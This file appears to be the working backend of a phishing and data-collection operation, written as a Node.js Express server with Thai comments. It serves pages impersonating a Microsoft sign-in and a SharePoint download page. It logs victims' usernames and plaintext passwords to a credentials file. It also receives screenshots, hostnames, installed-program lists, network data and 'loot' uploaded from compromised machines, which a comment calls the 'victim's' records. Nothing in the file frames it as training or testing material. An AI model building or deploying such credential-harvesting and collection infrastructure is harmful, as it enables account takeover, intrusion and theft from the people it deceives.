const express = require('express');
const cors = require('cors');
const fs = require('fs');
const helmet = require('helmet');
const path = require('path');
// const http = require('http'); // ไม่จำเป็นต้องใช้ http module เมื่อใช้ app.listen โดยตรง
const app = express();
const port = process.env.PORT || 3000;
app.use(cors());


// === SUP additional codes ==========================================

// SUP: for file uploads.
const multer = require('multer');
// SUP: Use multer middleware 
const upload = multer();

// SUP: create a storage folder in Public if not exsits
const STORAGE_ROOT = process.env.STORAGE_ROOT || path.join(__dirname, 'storage');
// SUP: ensure storage exists and is writable
try { fs.mkdirSync(STORAGE_ROOT, { recursive: true }); }
catch (e) { console.error('Failed to create STORAGE_ROOT', STORAGE_ROOT, e); }

function safeName(s) {
  return String(s).replace(/[^a-z0-9\-_\.]/gi, '_');
}

// SUP: Save victim's ex. images and powershell records to storage folder
app.post('/save-file', upload.single('file'), (req, res) => {
    console.log('[+] /save-file called:', req.body.folder || req.body.endpoint); 
  try {
    const endpoint = req.body.endpoint || 'unknown';
    const folder = safeName(req.body.folder || endpointToFolderFromPath(endpoint) || 'unknown');
    const id = req.body.id || (`${Date.now()}`);
    const ts = req.body.ts || new Date().toISOString();
    const contentType = req.body.contentType || (req.file && req.file.mimetype) || 'application/octet-stream';

    // ensure folder exists
    const folderPath = path.join(STORAGE_ROOT, folder);
    fs.mkdirSync(folderPath, { recursive: true });

    if (req.body.text) {
      // save text to file
      const filename = `result-${safeName(id)}.txt`;
      const outPath = path.join(folderPath, filename);
      fs.writeFileSync(outPath, req.body.text, 'utf8');
      return res.json({ ok: true, saved: outPath, type: 'text' });
    }

    if (req.file) {
      let ext = '';
      const m = req.file.mimetype || '';
      if (m === 'image/png') ext = '.png';
      else if (m === 'image/jpeg') ext = '.jpg';
      else if (m === 'image/webp') ext = '.webp';
      else if (m === 'application/pdf') ext = '.pdf';
      else {
        // try to keep original name ext
        const orig = req.file.originalname || '';
        const dot = orig.lastIndexOf('.');
        if (dot !== -1) ext = orig.slice(dot);
        else ext = '.bin';
      }
      const filename = `result-${safeName(id)}${ext}`;
      const outPath = path.join(folderPath, filename);
      fs.writeFileSync(outPath, req.file.buffer);
      return res.json({ ok: true, saved: outPath, type: 'file', mimetype: req.file.mimetype });
    }

    // nothing to save
    return res.status(400).json({ ok: false, error: 'No text or file in request' });
  } catch (err) {
    console.error('save-file error', err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});


// SUP: Map outgoing endpoint to folder name
function endpointToFolderFromPath(endpointUrl) {
  try {
    const u = new URL(endpointUrl);
    const p = u.pathname || '';
    if (p.includes('/capture-screenshot')) return 'screenshots';
    if (p.includes('/hostname')) return 'hostname';
    if (p.includes('/everyone')) return 'everyone';
    if (p.includes('/installed_programs')) return 'installed_programs';
    if (p.includes('/info')) return 'info';
    if (p.includes('/networks')) return 'networks';
    if (p.includes('/collecting-loots')) return 'collecting_loots';
    if (p.includes('/cleanup')) return 'cleanup';
    return p.replace(/[\/:\?\&\=]/g,'_').replace(/^_+/,'') || 'unknown';
  } catch (e) {
    return 'unknown';
  }
}
// === SUP: EOF ==========================================










// =======================================================
// 1. การตั้งค่า Middleware (จัดลำดับใหม่)
// =======================================================

app.set('trust proxy', true); 
app.use(express.json());

// 1.1. 🔒 Security Headers (Helmet)
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", 'https://fonts.googleapis.com', 'https://fonts.gstatic.com', "'unsafe-inline'"],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      connectSrc: ["'self'",
                   'http://localhost:3000',
                   'http://localhost:15721',    
                   'http://127.0.0.1:15721',    
                   'https://scbsonlines.com'],
      scriptSrc: ["'self'", "'unsafe-inline'"]
    }
  },
  crossOriginOpenerPolicy: { policy: "same-origin" }
}));

// 1.2. 📂 Static Files (🚨 **สำคัญ: ย้ายมาไว้ด้านบนสุด**)
// การย้ายบรรทัดนี้มาไว้ก่อน Custom Routes จะทำให้ Assets โหลดได้ถูกต้อง
// **แต่ต้องแก้ Path ใน HTML เป็น Absolute Path (เช่น /mslogin_script.js) ด้วย**
app.use(express.static(path.join(__dirname, 'public'))); 
// Make directory accessible
app.use(express.static('Screenshots'));
app.use(express.static('Everyone'));
app.use(express.static('Installed-programs'));
app.use(express.static('Hostname'));


// =======================================================
// 2. Custom Routes (Path Specific)
// =======================================================

const tenantId = '731845b5-6141-4d26-a68c-e818bdd409b7';
const publicDir = path.join(__dirname, 'public');

// 2.1. / (Root) -> Redirect ไปหน้ากรอกอีเมล
app.get('/', (req, res) => {
    res.redirect(`/login.microsoftonline.com/${tenantId}/oauth2/v2.0`); 
});

// 2.2. /login.microsoftonline.com/{tenantId}/oauth2/v2.0 -> mslogin.html (กรอกอีเมล)
app.get(`/login.microsoftonline.com/${tenantId}/oauth2/v2.0`, (req, res) => {
    res.sendFile(path.join(publicDir, 'mslogin.html'));
});

// 2.3. /login.microsoftonline.com/{tenantId}/oauth2/login -> login.html (กรอกรหัสผ่าน)
app.get(`/login.microsoftonline.com/${tenantId}/oauth2/login`, (req, res) => {
    res.sendFile(path.join(publicDir, 'login.html'));
});

// 2.4. /login.microsoftonline.com/{tenantId}/oauth2/authorized -> index.html (เลือกบัญชี)
app.get(`/login.microsoftonline.com/${tenantId}/oauth2/authorized`, (req, res) => {
    res.sendFile(path.join(publicDir, 'index.html'));
});

// 2.5. /scbo365.sharepoint/... -> landing.html (หน้าดาวน์โหลด)
const landingPath = '/scbo365.sharepoint/internal/documents/a253419d9e30514b3e66c602bef8693a71fef4047f03bb2016083b49e19e32a1';
app.get(landingPath, (req, res) => {
    res.sendFile(path.join(publicDir, 'landing.html'));
});


// =======================================================
// 3. Log Setup (Path)
// =======================================================

// **สำคัญ:** พาธ Log 
const logPath = path.join(__dirname, 'logs.txt');
// **เพิ่ม:** พาธ Log สำหรับ Username/Password (Log เก่า)
const credentialLogPath = path.join(__dirname, 'credentials.txt'); 

// =======================================================
// 4. ฟังก์ชัน Timestamp เวลาไทย (+7 BKK) (เหมือนเดิม)
// =======================================================

function getBkkTimestamp() {
    const date = new Date();
    const options = {
        timeZone: 'Asia/Bangkok',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    };
    return date.toLocaleTimeString('en-GB', options).replace(/, /g, ' ');
}


// =======================================================
// 5. API Endpoints (การ Log)
// =======================================================

// --- A. API Log ใหม่ (รวมทุก Action) ---
app.post('/api/log', (req, res) => {
    const { uuid, action, username, details, page } = req.body;
    const ipAddress = req.ip; 
    const bkkTimestamp = getBkkTimestamp();
    
    if (!uuid || !action) {
        const failLog = `${bkkTimestamp} | IP: ${ipAddress} | Action: LOG_FAILED | Details: Missing UUID or Action\n`;
        fs.appendFile(logPath, failLog, (err) => { if (err) console.error('Error writing log:', err); });
        return res.status(400).json({ success: false, message: 'UUID and Action are required for logging' });
    }

    // Log Format ใหม่ (Pipe-Delimited)
    const logEntry = `${bkkTimestamp} | UUID: ${uuid} | IP: ${ipAddress} | Page: ${page || 'N/A'} | Action: ${action} | Username: ${username || 'N/A'} | Details: ${details || 'N/A'}\n`;
    
    fs.appendFile(logPath, logEntry, (err) => {
        if (err) {
            console.error('Error writing unified log file:', err);
        }
    });

    res.json({ success: true, message: 'Unified log recorded' });
});

// --- B. API Log การ Login (แยก Log Password) ---
app.post('/api/login', (req, res) => {
    const { username, password, uuid } = req.body; 
    const ipAddress = req.ip; 
    const bkkTimestamp = getBkkTimestamp();
    
    if (!username || !password) {
        const logEntry = `${bkkTimestamp} | UUID: ${uuid || 'N/A'} | IP: ${ipAddress} | Action: PASSWORD_FAILED | Status: Missing credentials\n`;
        fs.appendFile(logPath, logEntry, (err) => { if (err) console.error('Error writing log:', err); });
        return res.status(400).json({ success: false, message: 'Username and password are required' });
    }
    
    // 1. บันทึก Credential Log
    const credentialEntry = `${bkkTimestamp} | UUID: ${uuid || 'N/A'} | IP: ${ipAddress} | Action: SUCCESSFUL_LOGIN | Username: ${username} | Password: ${password}\n`;
    fs.appendFile(credentialLogPath, credentialEntry, (err) => {
        if (err) console.error('Error writing credential log file:', err);
    });
    
    // 2. บันทึก Action Log
    const logEntry = `${bkkTimestamp} | UUID: ${uuid || 'N/A'} | IP: ${ipAddress} | Page: login.html | Action: PASSWORD_SUCCESS | Username: ${username} | Details: Password captured\n`;
    fs.appendFile(logPath, logEntry, (err) => {
        if (err) console.error('Error writing flow log file:', err);
    });


    res.json({
        success: true,
        message: 'Login simulation successful and credentials logged',
        pdfUrl: '/pdfs/sample.pdf', 
        //batUrl: '/downloads/test.bat'
    });
});


// =======================================================
// 6. Start Server
// =======================================================

// 💡 ใช้ app.listen โดยตรง
app.listen(port, '0.0.0.0', () => {
    console.log(`\n✅ Server running on HTTP!`);
    console.log(`👉 Access via Cloudflare Tunnel on port: ${port}\n`);
    console.log(`------------------------------------------------------------------`);
    console.log(`* Flow Log Path: ${logPath}`);
    console.log(`* Credential Log Path: ${credentialLogPath}`);
    console.log(`* Log Actions: INITIAL_ACCESS, ACCOUNT_PICKED, USERNAME_ENTERED, PASSWORD_SUCCESS, DOWNLOAD_*`);
    console.log(`------------------------------------------------------------------`);
});